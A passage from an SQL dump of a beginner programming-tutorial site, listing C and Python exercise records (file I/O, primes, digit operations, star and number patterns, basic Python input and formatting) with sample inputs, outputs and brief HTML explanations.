mode.\r\n\r\nfgetc() reads character by character from file.\r\n</p><p style=\"line-height: 1;\">\r\nNote: sample.txt should exsist  in the same folder where your program is located.</p>',9,NULL,NULL,NULL),(821,'Write something into the file','Write-something-into-the-file','Earse the content of file sample.txt and write something new.','B','','prog/c/writefile.c','<p style=\"line-height: 1;\">fopen() to open the specified file.</p><p style=\"line-height: 1;\"> \"sample.txt\" is file name. </p><p style=\"line-height: 1;\">\"w\" denotes open it in write mode and earse the existing content. </p><p style=\"line-height: 1;\">So write operation starts from begining.</p><p style=\"line-height: 1;\">\r\n\r\nFprintf() writes the content into the file.</p><p style=\"line-height: 1;\">\r\n\r\n\r\nNote: sample.txt should exist  in the same folder where your program is located.</p>',9,NULL,NULL,NULL),(822,'Append Something to the file','Append-Something-to-the-file','write something new into file sample.txt without earsing the exisiting content.','B','','prog/c/appendfile.c','<p style=\"line-height: 1;\">fopen() to open the specified file. </p><p style=\"line-height: 1;\">\"sample.txt\" is file name. </p><p style=\"line-height: 1;\">\"a\" denotes open it in write mode and keep existing content. </p><p style=\"line-height: 1;\">So write starts from last.</p><p style=\"line-height: 1;\">\r\nFprintf() writes the content into the file.</p><p style=\"line-height: 1;\">\r\n\r\n\r\nNote: sample.txt should exist  in the same folder where your program is located.</p>',9,NULL,NULL,NULL),(823,'Program to print the Factors of a Number N','Program-to-print-the-Factors-of-a-Number-N','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">12\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">1 2 3 4 6 12</p>','B','','prog/c/factors.c','refer video tutorial',10,'','raptor/factor_of_number_Nf9gsrs.png',''),(824,'Program to check whether given Integer is Prime or Not','Program-to-check-whether-given-Integer-is-Prime-or-Not','<p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">11</p><p style=\"line-height: 1;\">\r\nSample Output 1 :\r\n</p><p style=\"line-height: 1;\">11 is a Prime Number\r\n</p><p style=\"line-height: 1;\">\r\nSample Input 2 :\r\n</p><p style=\"line-height: 1;\">12\r\n</p><p style=\"line-height: 1;\">Sample Output 2 :\r\n</p><p style=\"line-height: 1;\">12 isnot  a Prime Number</p>','B','','prog/c/prime.c','refer video tutorial',10,NULL,NULL,NULL),(825,'Program to print the Prime numbers between two intervals','Program-to-print-the-Prime-numbers-between-two-intervals','<p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n10 40</p><p style=\"line-height: 1;\">\r\nSample Output 1 :\r\n</p><p style=\"line-height: 1;\">11 13 17 19 23 29 31 37 </p>','B','','prog/c/prime_interval.c','refer video tutorial',10,NULL,NULL,NULL),(826,'Program to print the Prime Factors of N','Program-to-print-the-Prime-Factors-of-N','<p style=\"line-height: 1;\">Sample Input 1 : </p><p style=\"line-height: 1;\">12</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">2 3</p>','B','','prog/c/prime_factors.c','refer video tutorial',10,NULL,NULL,NULL),(827,'Program to check whether given Integer is perfect number or not','Program-to-check-whether-given-Integer-is-perfect-number-or-not','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">6 is a Perfect Number\r\n(sum of factors of 6 is 6)</p>','B','','prog/c/perfect.c','refer video tutorial',10,NULL,NULL,NULL),(828,'Program to print the perfect numbers between two intervals','Program-to-print-the-perfect-numbers-between-two-intervals','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">1 20000\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n6 28 496 8128 </p>','B','','prog/c/perfect_interval.c','refer video tutorial',10,NULL,NULL,NULL),(829,'Program to check whether given Integer is Perfect Square or not','Program-to-check-whether-given-Integer-is-Perfect-Square-or-not','<p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">49\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n49 is a Perfect Square\r\n(7*7=49)</p>','B','','prog/c/perfectsquare.c','refer video tutorial',10,NULL,NULL,NULL),(830,'Program to Print the Perfect squares between two intervals','Program-to-Print-the-Perfect-squares-between-two-intervals','<p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">1 100\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">1 4 9 16 25 36 49 64 81 100</p>','B','','prog/c/perfectsquare_interval.c','refer video tutorial',10,NULL,NULL,NULL),(831,'Program to check whether given Integer is whether integer is power of 2 or not','Program-to-check-whether-given-Integer-is-whether-integer-is-power-of-2-or-not','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">64</p><p style=\"line-height: 1;\">\r\nSample Output 1 :\r\n</p><p style=\"line-height: 1;\">64 is Power of 2\r\n(2*2*2*2*2*2=64)</p>','B','','prog/c/powerof2.c','refer video tutorial',10,'','raptor/integer_is_power_of_2_or_not.PNG',''),(832,'Program to find GCD of given numbers','Program-to-find-GCD-of-given-numbers','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">12 24</p><p style=\"line-height: 1;\">\r\nSample Output 1 :\r\n</p><p style=\"line-height: 1;\">12</p>','B','','prog/c/gcd.c','refer video tutorial',10,'','raptor/gcd_DJTPUEW.PNG',''),(833,'Program to find LCM of given numbers','Program-to-find-LCM-of-given-numbers','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">10 25\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n50</p>','B','','prog/c/lcm.c','refer video tutorial',10,NULL,NULL,NULL),(834,'C Program to check whether the given digit is occurred in a Number','C-Program-to-check-whether-the-given-digit-is-occurred-in-a-Number','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">6372 3\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">3 is occurred in 6372</p>','B','','prog/c/digitoccured.c','refer video tutorial',11,NULL,NULL,NULL),(835,'C Program to count the occurence of digit','C-Program-to-count-the-occurence-of-digit','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">6372 3\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">3 is occurred in 6373 for 2 times</p>','B','','prog/c/countdigitoccurence.c','refer video tutorial',11,NULL,NULL,NULL),(836,'C Program to find the first digit of a number','C-Program-to-find-the-first-digit-of-a-number','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">734\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">First digit is 7</p>','B','','prog/c/firstdigit.c','refer video tutorial',11,NULL,NULL,NULL),(837,'C Program to Count the digits in the given number.','C-Program-to-Count-the-digits-in-the-given-number','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">734</p><p style=\"line-height: 1;\">\r\nSample Output 1 :\r\n</p><p style=\"line-height: 1;\">3</p>','B','','prog/c/countdigits.c','refer video tutorial',11,NULL,NULL,NULL),(838,'C Program to calculate sum of digits.','C-Program-to-calculate-sum-of-digits','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">734\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">14 (7+3+4)</p>','B','','prog/c/sumofdigits.c','refer video tutorial',11,NULL,NULL,NULL),(839,'C Program to calculate product of digits.','C-Program-to-calculate-product-of-digits','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">734\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">84 (7*3*4)</p>','B','','prog/c/productofdigits.c','refer video tutorial',11,'output/product_digits_of_number_c.jpg','raptor/Product_digits_of_number.PNG',''),(840,'C Program to reverse the digits of an number','C-Program-to-reverse-the-digits-of-an-number','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">734\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n347</p>','B','','prog/c/reversethedigits.c','refer video tutorial',11,'output/reverse_of_a_number_c.jpg','raptor/Reverse_of_a_number.PNG',''),(841,'C Program to check whether given Integer is Palindrome or Not','C-Program-to-check-whether-given-Integer-is-Palindrome-or-Not','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">656\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">Palindronme (Reverse of 656 is 656)</p>','B','','prog/c/palindronme_number.c','refer video tutorial',11,'output/palindrome_c.jpg','raptor/Palindrome.PNG',''),(842,'C Program to check whether given Integer is Armstrong or Not','C-Program-to-check-whether-given-Integer-is-Armstrong-or-Not','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">370\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">ArmStrong (3*3*3 + 7*7*7 + 0=370)</p><p style=\"line-height: 1;\">\r\nNote: Cube digits for 3 digit numbers,  square digits for two digit number and soon.</p>','B','','prog/c/armstrongnumber.c','refer video tutorial',11,'output/armstrong_number_c.jpg','raptor/Amstrong_number.PNG',''),(843,'C Program to draw Right Staircase Pattern','C-Program-to-draw-Right-Staircase-Pattern','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*\r\n**\r\n***\r\n****\r\n*****</pre>','B','','prog/c/staircaserl.c','Refer Video Tutorial',12,NULL,NULL,NULL),(844,'C Program to draw Left Staircase Pattern','C-Program-to-draw-Left-Staircase-Pattern','<p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    *\r\n   **\r\n  ***\r\n ****\r\n*****</pre>','B','','prog/c/staircaselr.c','Refer Video Tutorial',12,NULL,NULL,NULL),(845,'C Program to draw Pyramid Pattern','C-Program-to-draw-Pyramid-Pattern','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n5</p><p style=\"line-height: 1;\"> Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    *\r\n   ***\r\n  *****\r\n *******\r\n*********</pre>','B','','prog/c/pramid.c','Refer Video Tutorial',12,NULL,NULL,NULL),(846,'C Program to draw Inverse Pyramid Pattern','C-Program-to-draw-Inverse-Pyramid-Pattern','<p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*********\r\n *******\r\n  *****\r\n   ***\r\n    *</pre>','B','','prog/c/pramid_rev.c','Refer Video Tutorial',12,NULL,NULL,NULL),(847,'C Program to draw Inverse Right Staircase Pattern','C-Program-to-draw-Inverse-Right-Staircase-Pattern','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5&nbsp;</p><p style=\"line-height: 1;\"> Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*\r\n**\r\n***\r\n****\r\n*****</pre>','B','','prog/c/staircase_revrl.c','Refer Video Tutorial',12,NULL,NULL,NULL),(848,'C Program to draw Inverse Left Staircase Pattern','C-Program-to-draw-Inverse-Left-Staircase-Pattern','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*****\r\n ****\r\n  ***\r\n   **\r\n    *</pre>','B','','prog/c/staircase_revlr.c','Refer Video Tutorial',12,NULL,NULL,NULL),(849,'C Program to draw Pyramid Pattern like below','C-Program-to-draw-Pyramid-Pattern-like-below','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :</p><p style=\"line-height: 1;\">6</p><p style=\"line-height: 1;\">&nbsp;Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">     *</pre><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    **\r\n   ***\r\n  ****\r\n *****\r\n******\r\n *****\r\n  ****\r\n   ***\r\n    **\r\n     *</pre>','B','','prog/c/fullstair.c','Refer Video Tutorial',12,NULL,NULL,NULL),(850,'C Program to draw Interesting Pattern I','C-Program-to-draw-Interesting-Pattern-I','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">&nbsp;Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*\r\n**\r\n***\r\n****\r\n*****\r\n****\r\n***\r\n**\r\n*</pre>','B','','prog/c/fullstair1.c','Refer Video Tutorial',12,NULL,NULL,NULL),(851,'C Program to draw Diamond Pattern','C-Program-to-draw-Diamond-Pattern','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5 </p><p style=\"line-height: 1;\">Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    *\r\n   ***\r\n  *****\r\n *******\r\n*********\r\n *******\r\n  *****\r\n   ***\r\n    *</pre>','B','','prog/c/diamond.c','Refer Video Tutorial',12,NULL,NULL,NULL),(852,'C Program to draw Interesting Pattern II','C-Program-to-draw-Interesting-Pattern-II','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*        *\r\n**      **\r\n***    ***\r\n****  ****\r\n**********</pre>','B','','prog/c/half_udgai.c','Refer Video Tutorial',12,NULL,NULL,NULL),(853,'C Program to draw Interesting Pattern III','C-Program-to-draw-Interesting-Pattern-III','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*       *\r\n**     **\r\n***   ***\r\n**** ****\r\n*********</pre>','B','','prog/c/half_udgai1.c','Refer Video Tutorial',12,NULL,NULL,NULL),(854,'C Program to draw Interesting Pattern IV','C-Program-to-draw-Interesting-Pattern-IV','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">*       *\r\n**     **\r\n***   ***\r\n**** ****\r\n*********\r\n**** ****\r\n***   ***\r\n**     **\r\n*       *</pre>','B','','prog/c/udgai.c','Refer Video Tutorial',12,NULL,NULL,NULL),(855,'C Program to draw Interesting Pattern V','C-Program-to-draw-Interesting-Pattern-V','<p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n5</p><p style=\"line-height: 1;\"> Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">*********</p><p style=\"line-height: 1;\">\r\n *******</p><p style=\"line-height: 1;\">\r\n  *****</p><p style=\"line-height: 1;\">\r\n   ***</p><p style=\"line-height: 1;\">\r\n    *</p><p style=\"line-height: 1;\">\r\n   ***</p><p style=\"line-height: 1;\">\r\n  *****</p><p style=\"line-height: 1;\">\r\n *******</p><p style=\"line-height: 1;\">\r\n*********</p>','B','','prog/c/udgai_v.c','Refer Video Tutorial',12,NULL,NULL,NULL),(856,'C Program to draw Number pattern I','C-Program-to-draw-Number-pattern-I','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">1\r\n12\r\n123\r\n1234\r\n12345</pre>','B','','prog/c/staircase_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(857,'C Program to draw Number pattern II','C-Program-to-draw-Number-pattern-II','<p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    1\r\n   21\r\n  321\r\n 4321\r\n54321</pre>','B','','prog/c/staircase1_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(858,'C Program to draw Number pattern III','C-Program-to-draw-Number-pattern-III','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5</p><p style=\"line-height: 1;\">&nbsp;Sample Output 1 :\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    1\r\n   121\r\n  12321\r\n 1234321\r\n123454321</pre>','B','','prog/c/pyramid_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(859,'C Program to draw Number pattern IV','C-Program-to-draw-Number-pattern-IV','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5&nbsp; </p><p style=\"line-height: 1;\">Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    1\r\n   123\r\n  12345\r\n 1234567\r\n123456789</pre>','B','','prog/c/pyramid1_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(860,'C Program to draw Number pattern V','C-Program-to-draw-Number-pattern-V','<p style=\"line-height: 1;\">&nbsp;Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">&nbsp;Sample Output 1 :</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">111112\r\n322222\r\n333334\r\n544444\r\n555556</pre>','B','','prog/c/pattern3_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(861,'C Program to draw Number pattern VI','C-Program-to-draw-Number-pattern-VI','<p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">1\r\n32\r\n456\r\n10987\r\n1112131415</pre>','B','','prog/c/pattern2_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(862,'C Program to draw Number pattern VII','C-Program-to-draw-Number-pattern-VII','<p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    1\r\n   2 2\r\n  3 3 3\r\n 4 4 4 4\r\n5 5 5 5 5</pre>','B','','prog/c/pattern4_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(863,'C Program to draw Number pattern VIII','C-Program-to-draw-Number-pattern-VIII','<p style=\"line-height: 1;\">Sample Input:</p><p style=\"line-height: 1;\">\r\n5</p><p style=\"line-height: 1;\">Sample output 1:</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">1\r\n22\r\n333\r\n4444\r\n55555\r\n4444\r\n333\r\n22\r\n1</pre>','B','','prog/c/pattern5_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(864,'C Program to draw Number pattern IX','C-Program-to-draw-Number-pattern-IX','<p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5</p><p style=\"line-height: 1;\">Sample Output 1:</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">1\r\n23\r\n456\r\n78910\r\n1112131415\r\n78910\r\n456\r\n23\r\n1</pre>','B','','prog/c/pattern1_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(865,'C Program to draw Pascal triangle like below','C-Program-to-draw-Pascal-triangle-like-below','<p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">    1\r\n   1 1\r\n  1 2 1\r\n 1 3 3 1\r\n1 4 6 4 1</pre>','B','','prog/c/pascal_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(866,'C Program to draw trapezium like below','C-Program-to-draw-trapezium-like-below','<p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n4\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><pre class=\"content_p\" style=\"font-size: 20px; line-height: 1.42857; background-color: rgb(255, 255, 255);\">123417181920\r\n 567141516\r\n  891213\r\n   1011</pre>','B','','prog/c/trap_n.c','Refer Video tutorial',13,NULL,NULL,NULL),(867,'C Program to read all the files located in the specific directory','C-Program-to-read-all-the-files-located-in-the-specific-directory','Write a C Program should read the contents of files which is loacted in the directory.','B','','prog/c/reader1.c','<p style=\"line-height: 1;\"><dirent.h> is the header file has functions to process the directory.\r\n</dirent.h></p><p style=\"line-height: 1;\"><dirent.h>Opendir() function opens the directory\r\ndit-&gt;d_name gives the entries of the directory.\r\n</dirent.h></p><p style=\"line-height: 1;\"><dirent.h>If the entry is a file then it is processed using file operations.</dirent.h></p>',9,NULL,NULL,NULL),(868,'Python Hello World','Python-Hello-World','Python Program to print Hello World','B','','prog/python/welcome.py','<p style=\"line-height: 1;\">Python has very simple syntax. </p><p style=\"line-height: 1;\">You can start write your code directly, i.e., no main funtion in python.\r\n</p><p style=\"line-height: 1;\">Print() function prints the given object in screen or device.</p>',14,NULL,NULL,NULL),(869,'Python get input','Python-get-input','<p style=\"line-height: 1;\">Python Program to get input from the user.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\nhi boss</p><p style=\"line-height: 1;\">\r\nSample Output 1 :</p><p style=\"line-height: 1;\">\r\nhi boss</p>','B','','prog/python/message.py','input() is the predefined function which reads input from user and convert it as String.',14,NULL,NULL,NULL),(870,'Python get Integer input','Python-get-Integer-input','<p style=\"line-height: 1;\">Python Program to get an integer input from the user\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\"> 56</p>','B','','prog/python/number_ip.py','input() always returns string(), so the function int() converts the input to integer.',14,NULL,NULL,NULL),(871,'Python get float input','Python-get-float-input','<p style=\"line-height: 1;\">Python program to get fractional number from the user.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56.3426</p><p style=\"line-height: 1;\"> Sample Output 1:</p><p style=\"line-height: 1;\">\r\n56.3426</p>','B','','prog/python/float_ip.py','input() always returns string(), so the function float() converts the input to float.',14,NULL,NULL,NULL),(872,'Python Decimal places','Python-Decimal-places','<p style=\"line-height: 1;\">Python program to get a fractional number from user and display the same in two digit precision\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">56.3426 </p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">56.34</p>','B','','prog/python/decimalplace.py','<p style=\"line-height: 1;\">In python format specifiers are mentioned inside {} and value for the specifiers are passed through the format() method.</p><p style=\"line-height: 1;\"> Here :.2f specifies float value with 2 decimal point.</p>',14,NULL,NULL,NULL),(873,'Python New Line','Python-New-Line','Python Program to illustrate New line in print using \"\r\n\"','B','','prog/python/newline.py','\"\r\n\" is specifies for new line.',14,NULL,NULL,NULL),(874,'Python without new line','Python-without-new-line','Python Program to print content in same line while using multiple print statements.','B','','prog/python/wo_newline.py','<p style=\"line-height: 1;\">by default print() function prints new line at the end, to avoid this you can use end parameter.</p><p style=\"line-height: 1;\"> Here value of end parameter is space.</p>',14,NULL,NULL,NULL),(875,'Python tab Space','Python-tab-Space','Python Program to print tab space in output','B','','prog/python/tabspace.py','\"	\" is specifies for tab space.',14,NULL,NULL,NULL),(876,'Python Tuple Assignment','Python-Tuple-Assignment','Python program to illustrate what is tuple assignment?','B','','prog/python/tupleassign.py','<p style=\"line-height: 1;\">In python you can assign multiple variables with multiple values in single statement using comma. </p><p style=\"line-height: 1;\">This feature is called tuple asssingment.</p>',14,NULL,NULL,NULL),(877,'Python Integer to Character','Python-Integer-to-Character','<p style=\"line-height: 1;\">Python program to get an integer value and print the corresponding character of the integer.</p><p style=\"line-height: 1;\">\r\nSample Input 1:</p><p style=\"line-height: 1;\">\r\n97\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\na\r\n</p>','B','','prog/python/int2ascii.py','\"%c\" specifies character, here character of corresponding unicode value will be printed.',14,NULL,NULL,NULL),(878,'Python Decimal to HexaDecimal','Python-Decimal-to-HexaDecimal','<p style=\"line-height: 1;\">Python program to get an decimal number and covert it to Hexa Decimal number\r\n</p><p style=\"line-height: 1;\">Sample Input 1:\r\n</p><p style=\"line-height: 1;\">10\r\n</p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">\r\nA</p>','B','','prog/python/hexa.py',':x specifies hexa decimal value.',14,NULL,NULL,NULL),(879,'Python Hexa Decimal to Decimal','Python-Hexa-Decimal-to-Decimal','<p style=\"line-height: 1;\">Python program to get an Hexadecimal number and covert it to Decimal number\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\nA\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :\r\n</p><p style=\"line-height: 1;\">10</p>','B','','prog/python/hexa2int.py','0X denotes hexadecimal literal',14,NULL,NULL,NULL),(880,'Python Decimal to Octal','Python-Decimal-to-Octal','<p style=\"line-height: 1;\">Python program to get decimal number and covert it to Octal Number\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :\r\n</p><p style=\"line-height: 1;\">12\r\n</p><p style=\"line-height: 1;\">Sample Output 1 :</p><p style=\"line-height: 1;\">\r\n14\r\n</p>','B','','prog/python/octal',':O specifies octal value',14,NULL,NULL,NULL),(881,'Python Octal to Decimal','Python-Octal-to-Decimal','<p style=\"line-height: 1;\">Python program to get an Octal number and covert it to Decimal Number&nbsp;</p><p style=\"line-height: 1;\"> Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n14\r\n</p><p style=\"line-height: 1;\">Sample Input 1 :</p><p style=\"line-height: 1;\">\r\n12</p>','B','','prog/python/oct2int.py','0O denotes octal literal',14,NULL,NULL,NULL),(882,'python Exponent representation','python-Exponent-representation','<p style=\"line-height: 1;\">Python program to illustrate exponent representation</p><p style=\"line-height: 1;\">\r\nSample Input 1 :</p><p style=\"line-height: 1;\"> 45</p><p style=\"line-height: 1;\">\r\nSample Output 1 :</p><p style=\"line-height: 1;\"> 4.500000E+01\r\n</p>','B','','prog/python/exponent.py','%E specifies exponent representation',14,'','raptor/exponentiation_tKius4I.PNG',''),(883,'Python Addition','Python-Addition','<p style=\"line-height: 1;\">Python program to get two integer numbers, add both the integers and display the sum.\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n5\r\n6\r\n</p><p style=\"line-height: 1;\">Sample Output 1:\r\n</p><p style=\"line-height: 1;\">11\r\n</p>','B','','prog/python/addition.py','<p style=\"line-height: 1;\">Read two inputs using input() method.\r\n</p><p style=\"line-height: 1;\">Conver it into integer by int() method.\r\n</p><p style=\"line-height: 1;\">Add it using + operator.</p>',15,'','raptor/addition_HrCB9bZ.PNG',''),(884,'Python Subtraction','Python-Subtraction','<p style=\"line-height: 1;\">Python program to get two integer numbers, subtract both the integers and display the difference\r\n</p><p style=\"line-height: 1;\">Sample Input 1:</p><p style=\"line-height: 1;\">\r\n6\r\n5 </p><p style=\"line-height: 1;\">Sample Output 1:</p><p style=\"line-height: 1;\">1</p><p style=\"line-height: 1;\">Sample Input 2:</p><p style=\"line-height: 1;\">\r\n65 4</p><p style=\"line-height: 1;\"> Sample Output 2:\r\n</p><p style=\"line-height: 1;\">61\r\n</p>','B','','prog/python/subtraction.py','<p style=\"line-height: 1;\">Read two inputs using input() method.\r\n</p><p style=\"line-height: 1;\">Convert it into integer by int() method.\r\n</p><p style=\"line-height: 1;\">Subtract it using - operator.</p>',15,'','raptor/difference_ot77xrs.PNG',''),(885,'Python Multiplication','Python-Multiplication','<p 